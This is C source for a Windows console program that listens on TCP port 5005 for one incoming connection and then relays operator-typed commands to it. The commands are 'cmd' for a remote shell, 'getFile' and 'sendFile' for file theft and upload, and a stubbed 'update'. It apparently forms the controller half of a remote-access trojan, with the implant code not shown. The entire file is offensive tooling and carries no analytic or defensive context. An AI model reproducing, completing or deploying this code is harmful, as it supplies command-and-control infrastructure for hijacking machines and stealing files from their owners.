#include <stdio.h>
#include <windows.h>
#include "EA_Socket.h"
#include "process.h"

int port = 5005;

static void commWithSystem(void);
static int process(int sckt, char * al);

int main() // -municode
{
	WSADATA _wsdata;

	while (WSAStartup(MAKEWORD(2, 0), &_wsdata) != 0)
	{
		Sleep(1000);
	}

	commWithSystem();

	WSACleanup();

	return 0;
}

static void commWithSystem(void)
{
	char al[1024] = {0};
	int sckt, istemci;
	struct sockaddr_in veriler, verileri;
	int cnt = sizeof(verileri), de, yes = 1;

	while (1)
	{
		sckt = socket(AF_INET, SOCK_STREAM, 0);

		if (sckt != SOCKET_ERROR)
		{
			setsockopt(sckt, SOL_SOCKET, SO_REUSEADDR, (char * )&yes, sizeof(int));

			veriler.sin_family = AF_INET;
			veriler.sin_port = htons(port);
			veriler.sin_addr.s_addr = INADDR_ANY;
			memset(veriler.sin_zero, 0, 8);

			bind(sckt, (struct  sockaddr *)&veriler, sizeof(struct  sockaddr));
			listen(sckt, 10);

			while (1)
			{
				CNF_INFO("Waiting ...\n");

				if((istemci = accept(sckt, (struct  sockaddr *)&verileri, &cnt)) != SOCKET_ERROR)
				{
					break;
				}

				Sleep(1000);
			}

			CNF_INFO("Connected!\n");

			while(1)
			{
				CNF_INFO("Send Command : ");

				fgets(al, 300, stdin);

				senderText(istemci, al);

				if ((de = process(istemci, al)) != 0)
				{
					CNF_INFO("Didn't Work!\n");
					break;
				}
			}

			closesocket(sckt);
		}

		Sleep(1000);
	}
}

int process(int sckt, char * al)
{
	if (strncmp(al, "cmd", 3) == 0)
	{
		processRecvSendText(sckt);
	}
	else if (strncmp(al, "getFile ", 8) == 0)
	{
		processFileDownload(sckt, al + 8);
	}
	else if (strncmp(al, "sendFile ", 9) == 0)
	{
		processFileUpload(sckt, al + 9);
	}
	else if (strncmp(al, "update", 6) == 0)
	{
		// TODO: processUpdate(sckt);
	}

	return 0;
}
